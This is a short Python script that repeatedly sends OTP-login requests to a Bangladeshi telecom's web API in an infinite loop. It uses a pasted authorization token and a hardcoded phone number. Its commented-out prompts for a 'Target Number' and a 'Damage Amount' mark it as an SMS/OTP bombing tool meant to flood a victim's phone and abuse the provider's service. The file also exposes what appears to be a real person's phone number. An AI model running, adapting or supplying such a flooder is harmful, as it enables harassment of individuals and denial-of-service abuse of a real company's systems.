import requests, json,os, time
from requests.structures import CaseInsensitiveDict



url = "https://webapi.robi.com.bd/v1/account/login/otp"

headers = CaseInsensitiveDict()


cookie = str(input("[>] Enter New Authorization:"))

headers["Authorization"]= cookie
os.system('clear')
headers["Content-Type"]="application/json;charset=UTF-8"
#number=str(input("[>] Enter Your Target Number:"))


data = """{
  "phone_number": "01827747062",
  "redirectTo": null
}"""

#amount = int(input("[>] Enter Your Damage Amount:"))


#resp = requests.post(url, headers=headers, data=data)




while 1: 
    try:    
      resp = requests.post(url, headers=headers, data=data)
      response= resp.text 
      json_object = json.loads(response)
      json_formatted_str = json.dumps(json_object, indent=1)
      print(json_formatted_str)
    except:   
      print("Server Connection  Error!")
      
      

     
      
      
      
      


    
 

     
      
      
      
      


    
